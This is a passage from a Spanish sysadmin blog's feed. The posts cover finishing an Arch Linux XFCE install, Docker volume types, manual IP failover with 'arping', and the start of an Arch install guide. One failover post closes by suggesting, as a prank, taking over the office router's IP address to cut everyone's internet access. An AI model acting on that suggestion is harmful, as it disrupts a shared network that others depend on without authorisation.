&lt;p&gt;Activamos el &lt;em&gt;login manager&lt;/em&gt; para que salte automáticamente en cada &lt;em&gt;boot&lt;/em&gt; de nuestro sistema, usando &lt;strong&gt;systemd&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;root@archlinux ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;# systemctl enable lightdm&lt;/span&gt;
Created symlink /etc/systemd/system/display-manager.service → /usr/lib/systemd/system/lightdm.service.
&lt;span class="o"&gt;[&lt;/span&gt;root@archlinux ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y ya como detalles opcionales, vamos a habilitar el sonido y un gestor de redes, que nos van a hacer la vida mas fácil.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;root@archlinux ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;# pacman -S wicd wicd-gtk alsa-utils&lt;/span&gt;
resolviendo dependencias…
buscando conflictos entre paquetes…

Paquetes &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;22&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; ethtool-1:4.5-1  fftw-3.3.4-2  flac-1.3.1-3  libglade-2.6.4-5  libnl-3.2.27-1  libsamplerate-0.1.8-3
              libsndfile-1.0.26-1  net-tools-1.60.20130531git-1  pygobject2-devel-2.28.6-12  pygtk-2.24.0-6
              python-dbus-common-1.2.4-1  python2-2.7.11-3  python2-cairo-1.10.0-2  python2-dbus-1.2.4-1
              python2-gobject2-2.28.6-12  python2-urwid-1.3.1-2  rfkill-0.5-1  wireless_tools-30.pre9-1  wpa_supplicant-1:2.5-3
              alsa-utils-1.1.1-1  wicd-1.7.4-1  wicd-gtk-1.7.4-1

Tamaño total de la descarga:     &lt;span class="m"&gt;19&lt;/span&gt;,58 MiB
Tamaño total de la instalación:  &lt;span class="m"&gt;110&lt;/span&gt;,79 MiB

:: ¿Continuar con la instalación? &lt;span class="o"&gt;[&lt;/span&gt;S/n&lt;span class="o"&gt;]&lt;/span&gt; s
...
&lt;span class="o"&gt;[&lt;/span&gt;root@archlinux ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El paquete &lt;strong&gt;wicd&lt;/strong&gt; usa un frontal para el escritorio, pero todas las operaciones delicadas se delegan a un &lt;em&gt;daemon&lt;/em&gt; que funciona en segundo plano. De forma similar a &lt;strong&gt;Redhat&lt;/strong&gt;, los servicios no se instalan preparados para arrancar, y hay que activarlos manualmente.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;root@archlinux ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;# systemctl enable wicd&lt;/span&gt;
Created symlink /etc/systemd/system/dbus-org.wicd.daemon.service → /usr/lib/systemd/system/wicd.service.
Created symlink /etc/systemd/system/multi-user.target.wants/wicd.service → /usr/lib/systemd/system/wicd.service.
&lt;span class="o"&gt;[&lt;/span&gt;root@archlinux ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El subsistema de sonido funciona solo, salvo por el hecho de que hay que inicializar el dispositivo, y guardar los niveles de audio, para que se puedan restablecer tras cada &lt;em&gt;reboot&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;root@archlinux ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;# alsactl init&lt;/span&gt;
alsactl: sysfs_init:48: sysfs path &lt;span class="s1"&gt;&amp;#39;/sys&amp;#39;&lt;/span&gt; is invalid

Found hardware: &lt;span class="s2"&gt;&amp;quot;ICH&amp;quot;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Analog Devices AD1980&amp;quot;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;AC97a:41445370&amp;quot;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;0x1028&amp;quot;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;0x0177&amp;quot;&lt;/span&gt;
Hardware is initialized using a generic method
&lt;span class="o"&gt;[&lt;/span&gt;root@archlinux ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;# alsactl store&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;root@archlinux ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como paso final, vamos a necesitar un usuario con el que trabajar habitualmente, sin privilegios y sin la capacidad de romper nada.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;root@archlinux ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;# useradd -m gerard&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;root@archlinux ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;# passwd gerard&lt;/span&gt;
Introduzca la nueva contraseña de UNIX:
Vuelva a escribir la nueva contraseña de UNIX:
passwd: contraseña actualizada correctamente
&lt;span class="o"&gt;[&lt;/span&gt;root@archlinux ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Finalmente podemos reiniciar la máquina, y ver como nos queda de bonito.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;root@archlinux ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;# reboot&lt;/span&gt;
...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Si todo ha salido bien, nos queda un escritorio de esta apariencia, que tendremos que personalizar a nuestro gusto.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Escritorio XFCE" src="http://www.linuxsysadmin.ml/images/escritorio-xfce-archlinux.jpg"&gt;&lt;/p&gt;
&lt;p&gt;Y todo esto, con un consumo de recursos bastante escaso...&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@archlinux ~&lt;span class="o"&gt;]&lt;/span&gt;$ free -m
              total        used        free      shared  buff/cache   
available
Mem:            &lt;span class="m"&gt;498&lt;/span&gt;          &lt;span class="m"&gt;97&lt;/span&gt;         &lt;span class="m"&gt;310&lt;/span&gt;           &lt;span class="m"&gt;1&lt;/span&gt;          &lt;span class="m"&gt;89&lt;/span&gt;         
&lt;span class="m"&gt;379&lt;/span&gt;
Swap:           &lt;span class="m"&gt;522&lt;/span&gt;           &lt;span class="m"&gt;0&lt;/span&gt;         &lt;span class="m"&gt;522&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;gerard@archlinux ~&lt;span class="o"&gt;]&lt;/span&gt;$ 
&lt;/pre&gt;&lt;/div&gt;</content><category term="linux"></category><category term="archlinux"></category><category term="escritorio"></category><category term="xfce"></category></entry><entry><title>Tipos de volúmenes en Docker</title><link href="http://www.linuxsysadmin.ml/2016/07/tipos-de-volumenes-en-docker.html" rel="alternate"></link><published>2016-07-18T08:00:00+02:00</published><updated>2016-07-18T08:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-07-18:/2016/07/tipos-de-volumenes-en-docker.html</id><summary type="html">&lt;p&gt;Una de las mas importantes funcionalidades de &lt;strong&gt;Docker&lt;/strong&gt; son los volúmenes. Estos no son mas que carpetas en nuestro sistema de ficheros y son capaces de sobrevivir al ciclo de vida normal del contenedor. Eso nos permite, entre otras cosas, compartir varios ficheros con otros contenedores o con el &lt;em&gt;host …&lt;/em&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;Una de las mas importantes funcionalidades de &lt;strong&gt;Docker&lt;/strong&gt; son los volúmenes. Estos no son mas que carpetas en nuestro sistema de ficheros y son capaces de sobrevivir al ciclo de vida normal del contenedor. Eso nos permite, entre otras cosas, compartir varios ficheros con otros contenedores o con el &lt;em&gt;host&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Los volúmenes son bastante útiles porque permiten compartirse entre contenedores, o el propio &lt;em&gt;host&lt;/em&gt;. Eso nos permite consultar todos los &lt;em&gt;logs&lt;/em&gt; cómodamente desde un contenedor dedicado, hacer &lt;em&gt;backups&lt;/em&gt; de un contenedor desde otro dedicado, o recuperar esos mismo &lt;em&gt;backups&lt;/em&gt; hacia nuestro &lt;em&gt;host&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;De hecho, he visto contenedores con la única función de producir ficheros (&lt;em&gt;.tar.gz&lt;/em&gt;, &lt;em&gt;.deb&lt;/em&gt;, ...) en volúmenes que luego son consumidos por servicios de &lt;em&gt;runtime&lt;/em&gt;, por ejemplo un servidor web, un repositorio o simplemente un NFS.&lt;/p&gt;
&lt;p&gt;Los volúmenes pueden ser de 3 tipos distintos, y se categorizan según esta lista:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Data volumes&lt;ul&gt;
&lt;li&gt;Anonymous data volumes&lt;/li&gt;
&lt;li&gt;Named data volumes&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Mounted volumes&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Data volumes&lt;/h2&gt;
&lt;p&gt;Se trata de carpetas que se crean en &lt;em&gt;/var/lib/docker/&lt;/em&gt; y que pueden compartirse entre diferentes contenedores.&lt;/p&gt;
&lt;h3&gt;Anonymous data volumes&lt;/h3&gt;
&lt;p&gt;Se crean cuando se levanta un contenedor, mediante el comando &lt;em&gt;docker run&lt;/em&gt;, por ejemplo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ docker run -ti --rm -v /data alpine:3.4 sh
/ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Esto nos crea un volumen asociado al contenedor creado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@sirius:~# docker volume ls
DRIVER              VOLUME NAME
&lt;span class="nb"&gt;local&lt;/span&gt;               1b39e6601cd3711c27f3a1a4eb50d82e182151fd14b82048f47b0d50ad22b97a
root@sirius:~# tree /var/lib/docker/volumes/
/var/lib/docker/volumes/
├── 1b39e6601cd3711c27f3a1a4eb50d82e182151fd14b82048f47b0d50ad22b97a
│   └── _data
└── metadata.db

&lt;span class="m"&gt;2&lt;/span&gt; directories, &lt;span class="m"&gt;1&lt;/span&gt; file
root@sirius:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A su vez, otro contenedor puede montar los volúmenes de otro contenedor, ya sea porque los creó o porque los ha montado de un tercero.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@sirius:~# docker run -ti --rm --volumes-from adoring_lovelace alpine:3.4 sh
/ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora mismo, la carpeta &lt;em&gt;/data/&lt;/em&gt; pertenece al primer contendor, pero es la misma para ambos contenedores.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Docker&lt;/strong&gt; mantiene una cuenta de los contenedores que están usando un volumen, y estos solo se eliminan cuando el último contenedor que lo usa sale con el parámetro &lt;em&gt;--rm&lt;/em&gt; o si se hace un &lt;em&gt;docker rm -v&lt;/em&gt;. En cualquier otro caso, el volumen se queda parasitando, hasta que lo eliminamos manualmente usado &lt;em&gt;docker volume rm&lt;/em&gt;.&lt;/p&gt;
&lt;h3&gt;Named data volumes&lt;/h3&gt;
&lt;p&gt;Estos volúmenes no dependen de ningún contenedor concreto, y se pueden montar en cualquier contenedor. Se crean específicamente usando el comando &lt;em&gt;docker volume create&lt;/em&gt;, o al ejecutar un contenedor si le damos un nombre en la línea de comandos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ docker volume create --name vol1
vol1
gerard@sirius:~$ docker run -ti --rm -v vol2:/data alpine:3.4 &lt;span class="nb"&gt;true&lt;/span&gt;
gerard@sirius:~$ docker volume ls
DRIVER              VOLUME NAME
&lt;span class="nb"&gt;local&lt;/span&gt;               vol1
&lt;span class="nb"&gt;local&lt;/span&gt;               vol2
gerard@sirius:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Estos volúmenes no se eliminan por si solos nunca y persisten cuando su contenedor desaparece. Para eliminarlos se necesita una intervención manual mediante el comando &lt;em&gt;docker volume rm&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ docker volume ls
DRIVER              VOLUME NAME
&lt;span class="nb"&gt;local&lt;/span&gt;               vol1
&lt;span class="nb"&gt;local&lt;/span&gt;               vol2
gerard@sirius:~$ docker volume rm vol1 vol2
vol1
vol2
gerard@sirius:~$ docker volume ls
DRIVER              VOLUME NAME
gerard@sirius:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Mounted volumes&lt;/h2&gt;
&lt;p&gt;Otras veces nos interesa montar ficheros o carpetas desde la máquina &lt;em&gt;host&lt;/em&gt;. En este caso, podemos montar la carpeta o el fichero especificando la ruta completa desde la máquina &lt;em&gt;host&lt;/em&gt;, y la ruta completa en el contenedor. Es posible también especificar si el volumen es de lectura y escritura (por defecto) o de solo lectura.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker$ docker run -ti --rm -v /etc/hostname:/root/parent_name:ro -v /opt/:/data alpine:3.4 sh
/ &lt;span class="c1"&gt;# cat /root/parent_name &lt;/span&gt;
sirius
/ &lt;span class="c1"&gt;# ls /data/&lt;/span&gt;
/ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Este último caso es ideal para recuperar &lt;em&gt;backups&lt;/em&gt; o ficheros generados en un contenedor, en vistas a su utilización futura por parte de otros contenedores o del mismo &lt;em&gt;host&lt;/em&gt;.&lt;/p&gt;</content><category term="docker"></category><category term="volumenes"></category></entry><entry><title>Dirección IP compartida manualmente entre servidores</title><link href="http://www.linuxsysadmin.ml/2016/07/direccion-ip-compartida-manualmente-entre-servidores.html" rel="alternate"></link><published>2016-07-11T08:00:00+02:00</published><updated>2016-07-11T08:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-07-11:/2016/07/direccion-ip-compartida-manualmente-entre-servidores.html</id><summary type="html">&lt;p&gt;Cuando hablamos de alta disponibilidad, uno de los métodos mas utilizados es el &lt;strong&gt;failover&lt;/strong&gt;. La idea es que una de las máquinas es la que asume la totalidad del servicio, y el resto están preparadas para ejercer la misma función en el caso de que la primera deje de funcionar …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Cuando hablamos de alta disponibilidad, uno de los métodos mas utilizados es el &lt;strong&gt;failover&lt;/strong&gt;. La idea es que una de las máquinas es la que asume la totalidad del servicio, y el resto están preparadas para ejercer la misma función en el caso de que la primera deje de funcionar.&lt;/p&gt;
&lt;p&gt;En este campo hay varias soluciones como &lt;strong&gt;keepalived&lt;/strong&gt; y &lt;strong&gt;pacemaker&lt;/strong&gt;, pero en este artículo se pretende mostrar los conceptos mas básicos; haciendo manualmente los pasos y entendiendo como funciona todo, desde un punto de vista didáctico.&lt;/p&gt;
&lt;p&gt;Realmente esto es un intento mío para hacer una solución de alta disponibilidad, pero se quedó a medias. Lo escribo porque creo que puede ser útil en otro momento.&lt;/p&gt;
&lt;h2&gt;Punto de partida&lt;/h2&gt;
&lt;p&gt;Tenemos dos servidores normales, que vamos a convertir en un &lt;strong&gt;cluster&lt;/strong&gt; con configuración manual de &lt;strong&gt;failover&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# lxc-ls -f
NAME     STATE    IPV4      IPV6  AUTOSTART
-------------------------------------------
server1  RUNNING  &lt;span class="m"&gt;10&lt;/span&gt;.0.0.3  -     NO
server2  RUNNING  &lt;span class="m"&gt;10&lt;/span&gt;.0.0.4  -     NO
root@lxc:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Digamos que queremos dar un servicio web, aunque podríamos hacer de balanceadores, servidores de aplicación o lo que se necesite, en general.&lt;/p&gt;
&lt;p&gt;Vamos a poner un servidor web &lt;strong&gt;nginx&lt;/strong&gt;, que sirva una página HTML que nos indique la máquina que recibe las peticiones, a modo de comprobación.&lt;/p&gt;
&lt;p&gt;Vamos a instalar el servicio &lt;strong&gt;nginx&lt;/strong&gt; en ambas máquinas:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server1:~# apt-get install -y nginx-light
...  
root@server1:~#

root@server2:~# apt-get install -y nginx-light
...  
root@server2:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Creamos una página HTML con el nombre de cada máquina para ver quien recibe la petición HTTP:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server1:~# hostname &amp;gt; /var/www/html/index.html
root@server1:~#

root@server2:~# hostname &amp;gt; /var/www/html/index.html
root@server2:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y comprobamos que podemos diferenciar el servidor destino que recibe cada una de las peticiones:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# wget -qO- http://10.0.0.3/
server1
root@lxc:~# wget -qO- http://10.0.0.4/
server2
root@lxc:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Moviendo la dirección IP compartida&lt;/h2&gt;
&lt;p&gt;Además de la dirección IP de cada máquina, vamos a tener una que represente al miembro activo del &lt;strong&gt;cluster&lt;/strong&gt;, que por ejemplo, será la 10.0.0.2&lt;/p&gt;
&lt;p&gt;Si solo una de las máquinas tiene esa dirección IP asignada, el truco ya está hecho. Sin embargo, ¿que pasará si los dos nodos tienen la dirección IP compartida asignada? Puede pasará cualquier cosa.&lt;/p&gt;
&lt;p&gt;Para evitar este caso, un nodo que asuma el rol de primario también va a forzar a sus vecinos a actualizar sus tablas ARP, consiguiendo así &lt;strong&gt;robar&lt;/strong&gt; la dirección IP. Esto se puede conseguir con el comando &lt;strong&gt;arping&lt;/strong&gt; y por lo tanto, hay que instalarlo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server1:~# apt-get install -y iputils-arping
...  
root@server1:~#

root@server2:~# apt-get install -y iputils-arping
...  
root@server2:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Promocionando server1 a primario&lt;/h3&gt;
&lt;p&gt;El proceso de &lt;strong&gt;failover&lt;/strong&gt; consiste en agenciarse la dirección compartida. Para ello, tenemos que añadir una nueva dirección IP en nuestra interfaz de red. Como es posible que esta IP pertenezca a otro servidor, hay que lanzar el comando &lt;strong&gt;arping&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server1:~# ip addr add &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2/24 dev eth0
root@server1:~# arping -U -c1 &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2
ARPING &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2 from &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2 eth0
Sent &lt;span class="m"&gt;1&lt;/span&gt; probes &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; broadcast&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;))&lt;/span&gt;
Received &lt;span class="m"&gt;0&lt;/span&gt; response&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;)&lt;/span&gt;
root@server1:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El siguiente paso, aunque opcional, es educado; el servidor desplazado de primario a reserva, no necesita tener esa dirección asignada, en caso de que la tuviera (que no es el caso, pero no importa y lo ignoramos).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server2:~# ip addr del &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2/24 dev eth0
RTNETLINK answers: Cannot assign requested address
root@server2:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El resultado es que &lt;em&gt;server1&lt;/em&gt; tiene dos direcciones asignadas: la suya propia y la compartida, mientras que &lt;em&gt;server2&lt;/em&gt; solo tiene la suya.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# lxc-ls -f
NAME     STATE    IPV4                IPV6  AUTOSTART
-----------------------------------------------------
server1  RUNNING  &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2, &lt;span class="m"&gt;10&lt;/span&gt;.0.0.3  -     NO
server2  RUNNING  &lt;span class="m"&gt;10&lt;/span&gt;.0.0.4            -     NO
root@lxc:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y nuestras peticiones web, caen efectivamente en &lt;em&gt;server1&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# wget -qO- http://10.0.0.2/
server1
root@lxc:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Cambiando el primario de server1 a server2&lt;/h3&gt;
&lt;p&gt;El proceso es el mismo, pero al revés: &lt;em&gt;server2&lt;/em&gt; reclama la dirección compartida y &lt;em&gt;server1&lt;/em&gt; se deshace de ella por cortesía.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server2:~# ip addr add &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2/24 dev eth0
root@server2:~# arping -U -c1 &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2
ARPING &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2 from &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2 eth0
Sent &lt;span class="m"&gt;1&lt;/span&gt; probes &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; broadcast&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;))&lt;/span&gt;
Received &lt;span class="m"&gt;0&lt;/span&gt; response&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;)&lt;/span&gt;
root@server2:~#

root@server1:~# ip addr del &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2/24 dev eth0
root@server1:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y nuevamente, podemos ver donde está la dirección compartida y en que servidor caen nuestras peticiones.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# lxc-ls -f
NAME     STATE    IPV4                IPV6  AUTOSTART
-----------------------------------------------------
server1  RUNNING  &lt;span class="m"&gt;10&lt;/span&gt;.0.0.3            -     NO
server2  RUNNING  &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2, &lt;span class="m"&gt;10&lt;/span&gt;.0.0.4  -     NO
root@lxc:~#

root@lxc:~# wget -qO- http://10.0.0.2/
server2
root@lxc:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Usos poco éticos de esta técnica&lt;/h2&gt;
&lt;p&gt;Estamos en nuestra oficina y no queremos trabajar, con la excusa de que no hay internet. ¿Que nos impide asignarnos la dirección del &lt;em&gt;router&lt;/em&gt; a nuestra máquina? Esto haría que toda la oficina usara nuestra máquina de &lt;em&gt;gateway&lt;/em&gt;, que por supuesto, no sabe salir a internet, cortando efectivamente el tráfico exterior.&lt;/p&gt;
&lt;p&gt;Parece que esta idea ya se les ocurrió a los fabricantes de &lt;em&gt;routers&lt;/em&gt;, así que sus productos ya se preocupan de ir reclamando su dirección IP. Así que os puede funcionar puntualmente, y si queréis hacer la broma por un periodo largo, tendréis que librar una batalla de &lt;em&gt;arpings&lt;/em&gt; contra el &lt;em&gt;router&lt;/em&gt;.&lt;/p&gt;</content><category term="linux"></category><category term="failover"></category><category term="arping"></category></entry><entry><title>Instalando una máquina con Archlinux</title><link href="http://www.linuxsysadmin.ml/2016/07/instalando-una-maquina-con-archlinux.html" rel="alternate"></link><published>2016-07-04T20:00:00+02:00</published><updated>2016-07-04T20:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-07-04:/2016/07/instalando-una-maquina-con-archlinux.html</id><summary type="html">&lt;p&gt;Hoy quiero presentar una distribución de &lt;em&gt;linux&lt;/em&gt; que es una maravilla; es rápida, altamente actualizada, y lo último en innovación. Se trata de una distribución tipo &lt;em&gt;rolling&lt;/em&gt;, con una filosofía de última tendencia que es especialmente útil en un entorno no tan crítico, como puede ser una máquina tipo escritorio …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Hoy quiero presentar una distribución de &lt;em&gt;linux&lt;/em&gt; que es una maravilla; es rápida, altamente actualizada, y lo último en innovación. Se trata de una distribución tipo &lt;em&gt;rolling&lt;/em&gt;, con una filosofía de última tendencia que es especialmente útil en un entorno no tan crítico, como puede ser una máquina tipo escritorio.&lt;/p&gt;
&lt;p&gt;La parte menos buena, a parte del hecho de que los paquetes cambian mucho y pueden entrar algunos con algún fallo menor, es que la instalación no cuenta con un &lt;em&gt;wizard&lt;/em&gt;, aunque en el proceso podemos aprender como funciona fácilmente.&lt;/p&gt;
&lt;p&gt;Vamos a seguir bastante el procedimiento oficial de instalación, que podemos encontrar &lt;a href="https://wiki.archlinux.org/index.php/installation_guide"&gt;aquí&lt;/a&gt;. Este procedimiento de instalación lo vamos a lanzar sobre una máquina virtual, con un disco de 4gb y 512mb de memoria, aunque sin entorno gráfico necesita muchos menos recursos.&lt;/p&gt;
&lt;p&gt;El primer paso consiste en descargar una imagen de instalación que vamos a introducir (o montar, que es el equivalente en &lt;em&gt;VirtualBox&lt;/em&gt;), previo encendido de la máquina.&lt;/p&gt;
&lt;p&gt;Un detalle es que la imagen de instalación lleva instalado un servidor &lt;em&gt;SSH&lt;/em&gt;, que nos viene muy bien para capturar la salida de los diferentes comandos. Solo hay que levantar el servicio y darle una contraseña al usuario &lt;strong&gt;root&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@archiso ~ &lt;span class="c1"&gt;# passwd&lt;/span&gt;
Enter new UNIX password:
Retype new UNIX password:
passwd: password updated successfully
root@archiso ~ &lt;span class="c1"&gt;# systemctl start sshd&lt;/span&gt;
root@archiso ~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A partir de aquí, sigo el procedimiento desde una sesión &lt;em&gt;SSH&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Preparaciones&lt;/h2&gt;
&lt;p&gt;Aunque esto no es necesario, es recomendable usar nuestro teclado favorito. No hay nada mas frustrante que darle a una tecla pensando en un carácter y que te salga otro. Así que vamos a cargar la distribución de teclado que nos parezca.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@archiso ~ &lt;span class="c1"&gt;# loadkeys es&lt;/span&gt;
root@archiso ~ &lt;span class="c1"&gt;#&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El siguiente paso consiste en configurar la red que se va a usar durante la instalación. Por defecto viene preparado para usar &lt;em&gt;DHCP&lt;/em&gt;, que nos vale, así que la dejamos como está.&lt;/p&gt;
&lt;p&gt;Uno de los pasos mas importantes de toda la instalación es el particionado. Hacerlo mal en este punto es un problema futuro, y de hecho, mucha gente utiliza tecnologías como &lt;em&gt;LVM&lt;/em&gt; que les dan cierta flexibilidad para cambios futuros.&lt;/p&gt;
&lt;p&gt;En nuestro caso concreto, se trata de una máquina virtual que no va a durar mucho, así que nos basta con hacerlo a un nivel aceptable. Como disponemos de un solo disco de 4gb, vamos a particionarlo en dos, uno para el disco local, y otro para la partición de &lt;em&gt;swap&lt;/em&gt; (una pequeña, que no nos sobra el disco). Personalmente he usado &lt;strong&gt;cfdisk&lt;/strong&gt;, que me parece mas intuitivo que el resto, dejando las particiones de esta manera:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@archiso ~ &lt;span class="c1"&gt;# fdisk -l&lt;/span&gt;
